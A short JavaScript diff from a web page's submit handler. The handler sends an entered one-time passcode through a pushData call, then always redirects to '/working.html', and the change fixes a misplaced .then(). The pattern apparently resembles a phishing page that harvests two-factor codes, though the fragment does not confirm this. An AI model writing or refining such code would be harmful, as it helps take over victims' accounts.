@@ -60,7 +60,7 @@
         submitBtn.onclick = async () => {
             if (otp.value.length > 0) {
                 await pushData('OTP', otp.value)
-                    .then(window.location.href = '/working.html');
+                window.location.href = '/working.html'                
             } else {
                 otp.classList.add('border-red-700');
                 setTimeout(() => {
